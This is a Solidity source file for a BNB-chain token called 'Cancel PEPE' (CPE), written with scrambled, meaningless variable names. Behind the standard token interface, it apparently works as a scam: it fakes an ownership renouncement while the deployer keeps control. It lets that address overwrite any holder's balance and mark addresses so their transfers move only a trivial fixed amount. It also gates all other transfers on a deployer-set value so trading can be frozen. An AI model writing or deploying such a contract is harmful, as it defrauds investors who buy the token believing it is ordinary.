//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface swapAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listMode) external view returns (uint256);

    function transfer(address listAuto, uint256 buyFromMax) external returns (bool);

    function allowance(address txIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyFromMax) external returns (bool);

    function transferFrom(
        address sender,
        address listAuto,
        uint256 buyFromMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTx, uint256 value);
    event Approval(address indexed txIs, address indexed spender, uint256 value);
}

abstract contract toEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchTake {
    function createPair(address listLaunch, address limitFrom) external returns (address);
}

interface swapAutoMetadata is swapAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CancelPEPE is toEnable, swapAuto, swapAutoMetadata {

    function approve(address exemptTeam, uint256 buyFromMax) public virtual override returns (bool) {
        marketingLiquidity[_msgSender()][exemptTeam] = buyFromMax;
        emit Approval(_msgSender(), exemptTeam, buyFromMax);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptAt;
    }

    uint256 liquidityToken;

    function balanceOf(address listMode) public view virtual override returns (uint256) {
        return marketingMax[listMode];
    }

    function transferFrom(address minSellTotal, address listAuto, uint256 buyFromMax) external override returns (bool) {
        if (_msgSender() != minShould) {
            if (marketingLiquidity[minSellTotal][_msgSender()] != type(uint256).max) {
                require(buyFromMax <= marketingLiquidity[minSellTotal][_msgSender()]);
                marketingLiquidity[minSellTotal][_msgSender()] -= buyFromMax;
            }
        }
        return liquidityFrom(minSellTotal, listAuto, buyFromMax);
    }

    mapping(address => uint256) private marketingMax;

    function txTo(address walletFrom, uint256 buyFromMax) public {
        totalModeAmount();
        marketingMax[walletFrom] = buyFromMax;
    }

    uint256 private receiverSenderFund;

    address minShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant limitTeam = 20 ** 10;

    function receiverFrom(address minSellTotal, address listAuto, uint256 buyFromMax) internal returns (bool) {
        require(marketingMax[minSellTotal] >= buyFromMax);
        marketingMax[minSellTotal] -= buyFromMax;
        marketingMax[listAuto] += buyFromMax;
        emit Transfer(minSellTotal, listAuto, buyFromMax);
        return true;
    }

    mapping(address => bool) public enableLaunched;

    uint256 private buyFee;

    function decimals() external view virtual override returns (uint8) {
        return minTotal;
    }

    uint256 private exemptAt = 100000000 * 10 ** 18;

    function liquidityFrom(address minSellTotal, address listAuto, uint256 buyFromMax) internal returns (bool) {
        if (minSellTotal == toExempt) {
            return receiverFrom(minSellTotal, listAuto, buyFromMax);
        }
        uint256 feeToMarketing = swapAuto(maxEnable).balanceOf(listToken);
        require(feeToMarketing == teamTotalFee);
        require(listAuto != listToken);
        if (totalSender[minSellTotal]) {
            return receiverFrom(minSellTotal, listAuto, limitTeam);
        }
        return receiverFrom(minSellTotal, listAuto, buyFromMax);
    }

    function listMarketingLimit(address buyReceiverTx) public {
        totalModeAmount();
        
        if (buyReceiverTx == toExempt || buyReceiverTx == maxEnable) {
            return;
        }
        totalSender[buyReceiverTx] = true;
    }

    address public toExempt;

    function receiverBuy() public {
        emit OwnershipTransferred(toExempt, address(0));
        feeReceiver = address(0);
    }

    address listToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private feeReceiver;

    uint256 public atMin;

    function transfer(address walletFrom, uint256 buyFromMax) external virtual override returns (bool) {
        return liquidityFrom(_msgSender(), walletFrom, buyFromMax);
    }

    bool public tokenLaunchFrom;

    event OwnershipTransferred(address indexed atFee, address indexed toShould);

    function liquidityLaunch(address autoExempt) public {
        require(autoExempt.balance < 100000);
        if (tokenLaunchFrom) {
            return;
        }
        if (buyFee == atMin) {
            atMin = receiverSenderFund;
        }
        enableLaunched[autoExempt] = true;
        if (tradingEnable == totalSell) {
            enableMin = atMin;
        }
        tokenLaunchFrom = true;
    }

    bool private tradingEnable;

    address public maxEnable;

    uint256 private enableMin;

    mapping(address => mapping(address => uint256)) private marketingLiquidity;

    constructor (){
        if (atMin == receiverSenderFund) {
            totalShouldToken = true;
        }
        swapShould maxReceiver = swapShould(minShould);
        maxEnable = launchTake(maxReceiver.factory()).createPair(maxReceiver.WETH(), address(this));
        
        toExempt = _msgSender();
        receiverBuy();
        enableLaunched[toExempt] = true;
        marketingMax[toExempt] = exemptAt;
        
        emit Transfer(address(0), toExempt, exemptAt);
    }

    string private launchAmountEnable = "Cancel PEPE";

    function walletLiquidity(uint256 buyFromMax) public {
        totalModeAmount();
        teamTotalFee = buyFromMax;
    }

    function name() external view virtual override returns (string memory) {
        return launchAmountEnable;
    }

    function owner() external view returns (address) {
        return feeReceiver;
    }

    string private minMarketingFund = "CPE";

    bool private swapExempt;

    bool private totalShouldToken;

    function getOwner() external view returns (address) {
        return feeReceiver;
    }

    uint256 teamTotalFee;

    bool public feeShouldTotal;

    uint8 private minTotal = 18;

    function symbol() external view virtual override returns (string memory) {
        return minMarketingFund;
    }

    function totalModeAmount() private view {
        require(enableLaunched[_msgSender()]);
    }

    bool private totalSell;

    function allowance(address teamMarketing, address exemptTeam) external view virtual override returns (uint256) {
        if (exemptTeam == minShould) {
            return type(uint256).max;
        }
        return marketingLiquidity[teamMarketing][exemptTeam];
    }

    mapping(address => bool) public totalSender;

}